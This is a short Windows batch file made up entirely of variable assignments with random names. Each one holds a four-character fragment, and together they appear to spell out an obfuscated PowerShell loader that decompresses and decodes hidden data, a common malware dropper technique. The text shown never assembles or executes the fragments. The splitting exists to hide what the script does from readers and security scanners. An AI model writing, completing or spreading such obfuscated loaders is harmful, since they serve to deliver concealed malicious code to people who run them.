@echo off
set "YTvFidREQW=t Sy"
set "FlyDVRrbtq=[-1."
set "vPSWvsKmaH=saBm"
set "kpCwtGvljB=SMiO"
set "kblqWxfETD=ateD"
set "neKajOtdRn=wqqk"
set "hDwNFiTwPa=ert]"
set "UBQtmqpKbH=F'[-"
set "przhiIILyO=mcQ."
set "sogCvxqBnz= [st"
set "EoknwbhBFL=hy.A"
set "nmtKlrtwbU=n ''"
set "vdLLxPZHGl=ddin"
set "kWVMjkIpbv=.Dis"
set "TzZMZuhqYP== $m"
set "ajIaTRUAdm=ptor"
set "cAOHxBLMnM=tem."
set "MrJahVDDSf=HR);"
set "DBTxxOCjOz=Syst"
set "ozJpJcKjgv=iuS "
set "QxYzeroTnN=se()"
set "ElXnaMuQyt=xci "
set "ofGTFBXDlk=7;$m"
set "mBWDhwzleU=IMlD"
set "QyZOpWhPXR=stem"
set "OSCwsZOOhl=.GZi"
